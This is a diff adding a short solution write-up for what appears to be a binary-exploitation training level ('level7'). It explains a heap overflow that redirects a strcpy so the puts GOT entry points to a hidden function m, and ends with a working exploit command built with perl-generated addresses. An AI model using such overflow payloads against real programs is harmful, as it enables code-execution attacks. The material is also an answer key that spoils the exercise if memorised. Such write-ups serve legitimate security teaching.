@@ -1,0 +1,5 @@
+1. We understood that the program firstly allocate memory, copy the 2 first argvs, opens the passfile and puts something.
+2. We make the first copy overflow to the second memory sector to change where the second strcpy will write
+3. Here we want to edit the GOT to make the program execute the m function rather than the puts function
+4. So as the second parameter, we set the address of the m function.
+5. This is the exploit command : /level7 $(perl -e 'print "1"x20 . "\x28\x99\x04\x08"') `perl -e 'print "\xf4\x84\x04\x08"'`
